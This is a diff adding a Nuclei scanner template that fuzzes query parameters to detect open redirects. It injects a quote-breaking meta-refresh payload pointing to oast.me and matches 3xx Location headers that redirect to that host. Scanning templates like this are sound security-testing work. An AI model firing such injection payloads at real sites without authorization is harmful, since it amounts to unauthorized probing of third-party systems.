@@ -1,0 +1,43 @@
+id: nagli-redirection-catcher
+
+info:
+  name: Nagli Url Redirection Template Via Params
+  author: reewardius
+  severity: low
+  reference: https://twitter.com/naglinagli/status/1316671412686462976
+  tags: fuzzing-redirect,fuzzing-req
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      
+    payloads:
+      redirect:
+        - '\"><meta http-equiv="Refresh" content=0; url=https://oast.me">'
+        
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+        - "{{redirect}}"
+        
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: header
+        regex:
+          - '(?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]*)oast\.me\/?(\/|[^.].*)?$'
+
+      - type: status
+        status:
+          - 301
+          - 302
+          - 303
+          - 304
+          - 306
+          - 307
+          - 308
+        condition: or
